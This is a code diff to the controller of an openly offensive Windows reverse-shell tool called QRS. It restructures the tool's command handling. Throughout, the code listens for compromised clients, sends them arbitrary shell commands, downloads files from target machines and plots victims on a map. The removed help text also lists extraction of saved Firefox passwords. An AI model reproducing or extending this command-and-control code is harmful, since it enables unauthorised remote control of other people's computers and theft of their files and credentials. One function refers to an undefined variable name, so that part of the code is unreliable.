@@ -16,25 +16,6 @@ import re as r
 from colorama import init, Fore, Back, Style
 
 SEPARATOR = "<sep>"  # For separating filename and filesize
-HelpList = ["This is a List of all available commands", "===================Description====================\n",
-            "QRS a fully interactive Reverse Shell for Windows CMD so you can use any CMD commands",
-            "=====================Commands=====================\n",
-            '============Terminal Commands=============',
-            "Connections - Shows all active connections and their status",
-            "Connect <client_ID> - Connects to the specified client ID",
-            "Clear - Clears the screen",
-            "Clear connections - Clears all connections from the list",
-            "Clear inactive - Clears all inactive connections from the list",
-            "Update - Updates QRS to the latest version from the repository",
-            "Exit - Exits the reverse shell",
-            "Quit - Quits QRS",
-            "Help - Shows this message",
-            "============In Shell commands=============", 
-            "Start file server - Starts a file server to receive files from the target machine",
-            "Download <filename> - Downloads a file from the target machine to the local machine into /received_files",
-            "extract passwords firefox (<profile-ID>) - Extracts saved passwords from Firefox (provide profile ID if needed)",
-            "ping - Pings the target machine\n",
-            ]
 
 client_id = 0
 clients = []
@@ -363,10 +344,8 @@ def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
     os.chdir(repo_path)
 
     try:
-        # Fetch remote without printing anything
         subprocess.run(['git', 'fetch'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
 
-        # Get local and remote commit hashes
         local_commit = subprocess.check_output(
             ['git', 'rev-parse', branch],
             stderr=subprocess.DEVNULL
@@ -376,13 +355,11 @@ def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
             stderr=subprocess.DEVNULL
         ).strip()
 
-        # Get local version
         local_version = "unknown"
         if os.path.exists(version_file):
             with open(version_file) as f:
                 local_version = f.read().strip()
 
-        # Get remote version
         try:
             remote_version = subprocess.check_output(
                 ['git', 'show', f'origin/{branch}:{version_file}'],
@@ -391,9 +368,13 @@ def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
         except subprocess.CalledProcessError:
             remote_version = "unknown"
 
-        # Show status
         if local_commit != remote_commit:
-            print(f"[!] Update available. {local_version} > {remote_version}")
+            commit_msg = subprocess.check_output(
+                ['git', 'log', '-1', '--pretty=%s', f'origin/{branch}'],
+                stderr=subprocess.DEVNULL
+            ).decode().strip()
+
+            print(f"[!] Update available {local_version} > {remote_version}: {commit_msg}")
         else:
             print(f"[✓] You're up to date. Version: {local_version}")
 
@@ -403,12 +384,205 @@ def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
         os.chdir(original_cwd)
 
 
+
 def StopServices():
     print(f"\n[*] Stopping services...")
     stop_http_server()
     stop_file_server()
     print(f"{TimeStamp()} services stopped.")
 
+# Command handling system
+commands = {}
+def parse_args(cmdName, arg_spec, raw_args):
+    parsed = []
+    for i, arg in enumerate(arg_spec):
+        if len(arg) == 3:
+            name, type_, optional = arg
+        else:
+            name, type_ = arg
+            optional = False
+
+        if i >= len(raw_args):
+            if optional:
+                parsed.append(None)
+                continue
+            else:
+                raise ValueError(f"Missing argument: {cmd_name} <{name}({type_.__name__})>")
+
+        try:
+            parsed.append(type_(raw_args[i]))
+        except ValueError:
+            raise ValueError(f"Invalid value for {name}: expected {type_.__name__}")
+    return parsed
+
+
+def command(name, arg_spec=None, description=""):
+    def wrapper(func):
+        commands[name] = {
+            "func": func,
+            "args": arg_spec or [],
+            "description": description,
+        }
+        return func
+    return wrapper
+
+def find_command(parts):
+    for length in range(len(parts), 0, -1):
+        cmd_name = " ".join(parts[:length]).lower()
+        if cmd_name in commands:
+            return cmd_name, parts[length:]
+    return None, parts
+
+
+@command("quit", description="Quit the program")
+def cmd_quit():
+    exit(0)
+@command("connections", description="Show all active connections")
+def cmd_connections():
+    __str__(clients)
+@command("clear", description="Clears the Terminal screen")
+def cmd_clear():
+    os.system("cls" if os.name == "nt" else "clear")
+@command("clear inactive", description="Clear inactive connections")
+def cmd_clear_inactive():
+    RemoveInactiveClients()
+@command("clear connections", description="Clear all connections")
+def cmd_clear_connections():
+    global clients
+    clearedConnections = len(clients)
+    clients.clear()
+    print(f"{TimeStamp()} {clearedConnections} Connection(s) cleared.")
+@command("download", arg_spec=[("filename", str)], description="Download a file from the target machine")
+def cmd_download(filename):
+    global clients
+    if len(clients) == 0:
+        print(f"{TimeStamp()} No connections found.")
+        return
+    client = clients[0]
+    if client.GetStatus() == "INACTIVE":
+        print(f"Client {client.client_id} is inactive. Removing from the list.")
+        clients.pop(0)
+        return
+
+    print(f"{TimeStamp()} Downloading {filename} from {client.client_address[0]}:{client.client_address[1]}...")
+    client.client_socket.send(f"download{SEPARATOR}{filename}".encode())
+    response = client.client_socket.recv(BUFFER_SIZE).decode()
+    if response == "READY":
+        print(f"{TimeStamp()} File server is ready to receive the file.")
+    else:
+        print(f"[!] Error: {response}")
+@command("help", description="Show this help message")
+def cmd_help():
+    print("Commands:")
+    for name, info in commands.items():
+        arg_list = " ".join(
+            f"<{n}({t.__name__})>" 
+            for arg in info["args"]
+            for n, t in [arg[:2]]
+        )        
+        print(f"  {name} {arg_list} — {info['description']}")
+@command("update", description="Update QRS to the latest version")
+def cmd_update():
+    print(f"{TimeStamp()} Updating QRS...")
+    try:
+        subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
+        print(f"{TimeStamp()} QRS updated successfully. Restarting...")
+        StopServices()
+        print(f"{TimeStamp()} Restarting QRS in 3 sec...")
+        time.sleep(3)
+        os.system("cls" if os.name == "nt" else "clear")
+        subprocess.run("python QRS.py", shell=True, check=True)
+        exit(0)
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Error occurred while updating QRS: {e.stderr}")
+
+@command("map connections", arg_spec=[("cmd", str, True)], description="Map connections on a world map")
+def cmd_map_connections(cmd):
+    if cmd == "-cmd":
+        print(f"{TimeStamp()} Mapping connections in command line...")
+        MapConnectionsCMD(world_map, clients)
+    else:
+        print(f"{TimeStamp()} Mapping connections...")
+        MapConnections(clients)
+        try:
+            webbrowser.open('clients_map.html')
+            print("[*] Map opened in web browser.")
+        except FileNotFoundError:
+            print("[!] Map file not found.")
+
+@command("type", description="Show the buffer size")
+def cmd_type():
+    print(f"[*] The Buffer size is currently set to {BUFFER_SIZE/1000000} MB. If you want to see larger files use the 'download' command.")
+
+@command("start file server", description="Start a file server to receive files from the target machine")
+def cmd_start_file_server():
+        start_file_server_in_thread()
+        print(f"{TimeStamp()} File server started on {SERVER_HOST}:5005")
+
+
+@command("connect", arg_spec=[("client_id", int)], description="Connect to a specific client")
+def cmd_connect(client_id):
+    global clients, connect
+    if client_id >= len(clients) or client_id < 0:
+        print("Invalid client ID.")
+        return
+    
+    client = clients[client_id]
+    if client.GetStatus() == "INACTIVE":
+        print(f"Client {client_id} is inactive. Removing from the list.")
+        clients.pop(client_id)
+        return
+
+    print(f"{TimeStamp()} Connecting to {client.client_address[0]}:{client.client_address[1]}...")
+    connect = True
+
+    s = socket.socket()
+    s.bind((SERVER_HOST, SERVER_PORT))
+    print(f"{TimeStamp()} Waiting for client({client.client_address[0]}) connection on {SERVER_HOST}:{SERVER_PORT} ...")
+    s.listen(5)
+    s.settimeout(5)
+    while True:
+        try:
+            client_socket, client_address = s.accept()
+            print(f"{TimeStamp()} {client_address[0]}:{client_address[1]} Connection established!")
+
+            cwd = client_socket.recv(BUFFER_SIZE).decode()
+            while True:
+                local_cmd_input = input(f"{cwd} $> ")
+                if not local_cmd_input.strip():
+                    continue
+                local_parts = local_cmd_input.split()
+                local_cmd_name, local_raw_args = find_command(local_parts)
+                try:
+                    local_cmd = commands[local_cmd_name]
+                    parsed_args = parse_args(local_cmd_name, local_cmd["args"], local_raw_args)
+                    local_cmd["func"](*parsed_args)
+                except KeyError:
+                    pass
+                except Exception as e:
+                    print(f"[!] There was an error while finding or executing a shell command: {e}")
+
+                client_socket.send(local_cmd_input.encode())
+                output = client_socket.recv(BUFFER_SIZE).decode()
+                
+                # Send exit before exiting to ensure the client is also closed
+                if local_cmd_input.lower() == "exit":
+                    break
+                try:
+                    results, cwd = output.split(SEPARATOR)
+                except ValueError as e:
+                    if "not enough values to unpack" in str(e):
+                        results = f"[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file, {e}"
+                except Exception as e:
+                    results = f"[!] Error occurred while receiving data: {e}"
+                print(results)
+            break
+        except socket.timeout:
+            print(f"[!] Connection timed out. There was en error on the client side.")
+            break
+        except Exception as e:
+            print(f"[!] Server side Error occurred: {e}")
+            break
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
@@ -435,122 +609,19 @@ print("--------------------------------------------------")
 CheckForUpdates()
 print("\n")
 while True:
-    cmd = input(f"{TimeStamp()} $> ")
-    if not cmd.strip():
+    cmd_input = input(f"{TimeStamp()} $> ").strip().lower()
+    if not cmd_input:
         continue
-    if cmd.lower() == "exit":
-        break
-    if cmd.lower() == "help":
-        for i in HelpList:
-            print(i + "\n")
+    parts = cmd_input.split()
+    cmd_name, raw_args = find_command(parts)
+
+    if cmd_name is None:
+        print(f"Unknown command: {parts[0]}")
         continue
-    if cmd.lower() == "connections":
-        __str__(clients)
-        continue
-    if cmd.lower() == "update":
-        print(f"{TimeStamp()} Updating QRS...")
-        try:
-            subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
-            print(f"{TimeStamp()} QRS updated successfully. Restarting...")
-            StopServices()
-            print(f"{TimeStamp()} Restarting QRS in 3 sec...")
-            time.sleep(3)
-            os.system("cls" if os.name == "nt" else "clear")
-            subprocess.run("python QRS.py", shell=True, check=True)
-            exit(0)
-        except subprocess.CalledProcessError as e:
-            print(f"[!] Error occurred while updating QRS: {e.stderr}")
-    if cmd.lower() == "quit":
-        print(f"{TimeStamp()} Quitting QRS...")
-        exit(0)
 
-    SplitedCMD = cmd.split()
-    if SplitedCMD[0].lower() == "clear":
-        if len(SplitedCMD) < 2:
-            os.system("cls" if os.name == "nt" else "clear")
-        elif SplitedCMD[1].lower() == "connections":
-            print(f"{TimeStamp()} Clearing connection(s)...")
-            clearedConnections = len(clients)
-            clients.clear()
-            print(f"{TimeStamp()} {clearedConnections} Connection(s) cleared.")
-        elif SplitedCMD[1].lower() == "inactive":
-            print(f"{TimeStamp()} Clearing inactive connections...")
-            RemoveInactiveClients()
-    if SplitedCMD[0].lower() == "map":
-        if SplitedCMD[1].lower() == "connections":
-            if SplitedCMD[2].lower() == "-cmd":
-                print(f"{TimeStamp()} Mapping connections in command line...")
-                MapConnectionsCMD(world_map, clients)
-                __str__(clients)
-            else:
-                print(f"{TimeStamp()} Mapping connections...")
-                MapConnections(clients)
-                try:
-                    webbrowser.open('clients_map.html')
-                    print("[*] Map opened in web browser.")
-                except FileNotFoundError:
-                    print("[!] Map file not found.")
-    if SplitedCMD[0].lower() == "connect":
-        local_client_ID = int(SplitedCMD[1])
-        if local_client_ID >= len(clients) or local_client_ID < 0:
-            print("Invalid client ID.")
-            continue
-
-        client = clients[local_client_ID]
-        if client.GetStatus() == "INACTIVE":
-            print(f"Client {local_client_ID} is inactive. Removing from the list.")
-            clients.pop(local_client_ID)
-            continue
-
-        print(f"{TimeStamp()} Connecting to {client.client_address[0]}:{client.client_address[1]}...")
-        connect = True
-
-        s = socket.socket()
-        s.bind((SERVER_HOST, SERVER_PORT))
-        print(f"{TimeStamp()} Waiting for client({client.client_address[0]}) connection on {SERVER_HOST}:{SERVER_PORT} ...")
-        s.listen(5)
-        s.settimeout(5)
-        while True:
-            try:
-                client_socket, client_address = s.accept()
-                print(f"{TimeStamp()} {client_address[0]}:{client_address[1]} Connection established!")
-                # Connection Command Loop
-
-                cwd = client_socket.recv(BUFFER_SIZE).decode()
-                while True:
-                    cmd = input(f"{cwd} $> ")
-                    if not cmd.strip():
-                        continue
-                    SplitedCMD = cmd.split()
-                    if SplitedCMD[0].lower() == "type":
-                        print(f"[*] The Buffer size is currently set to {BUFFER_SIZE/1000000} MB. If you want to see larger files use the 'download' command.")
-                    if cmd.lower() == "help":
-                        for i in HelpList:
-                            print(i)
-                            print("\n")
-                        continue     
-                    if cmd.lower() == "start file server":
-                        print(f"{TimeStamp()} Starting File Server ...")
-                        start_file_server_in_thread()
-                        continue
-                    client_socket.send(cmd.encode())
-                    output = client_socket.recv(BUFFER_SIZE).decode()
-                    
-                    # Send exit before exiting to ensure the client is also closed
-                    if cmd.lower() == "exit":
-                        break
-                    try:
-                        results, cwd = output.split(SEPARATOR)
-                    except ValueError as e:
-                        if "not enough values to unpack" in str(e):
-                            results = f"[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file, {e}"
-                    except Exception as e:
-                        results = f"[!] Error occurred while receiving data: {e}"
-                    print(results)
-                break
-            except socket.timeout:
-                print(f"[!] Connection timed out. There was en error on the client side.")
-                break
-            except Exception as e:
-                print(f"[!] Server side Error occurred: {e}")
-                break
+    cmd = commands[cmd_name]
+    try:
+        parsed_args = parse_args(cmd_name, cmd["args"], raw_args)
+        cmd["func"](*parsed_args)
+    except ValueError as e:
+        print("Error:", e)
